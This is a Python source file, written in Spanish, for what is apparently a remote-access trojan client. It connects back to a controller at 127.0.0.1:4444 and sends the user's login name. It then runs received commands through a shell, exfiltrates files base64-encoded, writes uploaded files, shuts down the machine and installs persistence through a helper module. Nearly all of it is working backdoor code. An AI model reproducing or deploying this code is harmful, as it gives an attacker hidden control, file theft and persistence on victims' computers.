import base64
import socket
import subprocess
from colorama import Fore, Style
from extras import persistencia
import json
import os
import sys


class Cliente:
    def __init__(self, ip, puerto):
        while True:
            try:
                self.connection = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, puerto))
                self.datosEnviados(os.getlogin())
            except socket.error:
                pass
            else:
                break

    def datosRecibidos(self):
        datosJson = b""
        while True:
            try:
                datosJson += self.connection.recv(1024)
                return json.loads(datosJson)
            except ValueError:
                continue

    def datosEnviados(self, datos):
        datosJson = json.dumps(datos)
        self.connection.send(datosJson.encode())

    def toString(self, s):
        convStr = ""
        for i in s:
            convStr += " " + i 
        return convStr

    def ejecutarComando(self, comando):
        return subprocess.check_output(
            comando, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )

    def subirArchivo(self, ruta):
        with open(ruta, "rb") as file:
            return base64.b64encode(file.read())

    def descargarArchivos(self, ruta, contenido):
        with open(ruta, "wb") as file:
            file.write(base64.b64decode(contenido))
            return "Se ha subido el archivo correctamente"


    def run(self):
        sistema = sys.platform
        if sistema.startswith('win'):
            sistema = 'win'
        elif sistema.startswith('linux'):
            sistema = 'nix'
        elif sistema.startswith('darwin'):
            sistema = 'mac'
        else:
            sistema = 'unk'

        while True:
            comando = self.datosRecibidos()
            try:
                if not comando:
                    continue
        
                elif comando[0] == "salir":
                    self.connection.close()
                    sys.exit()

                elif comando[0] == "cd" and len(comando) > 1:
                    os.chdir(comando[1])
                    resComando = "Directorio cambiado"

                elif comando[0] == "subida":
                    resComando = self.descargarArchivos(comando[1], comando[2])
                
                elif comando[0] == "descarga":
                    resComando = self.subirArchivo(comando[1]).decode()
                
                elif comando[0] == "apagar":
                    os.system("shutdown /s /t 1")

                elif comando[0] == "persistencia":
                    resComando = persistencia.run(sistema)

                else:
                    comandoToString = self.toString(comando)
                    resComando = self.ejecutarComando(comandoToString).decode()
            except Exception as e:
                resComando = Fore.RED + Style.BRIGHT + "Error al ejecutar el comando, checa la syntaxis" + Style.RESET_ALL
            self.datosEnviados(resComando)

cliente = Cliente("127.0.0.1", 4444)
cliente.run()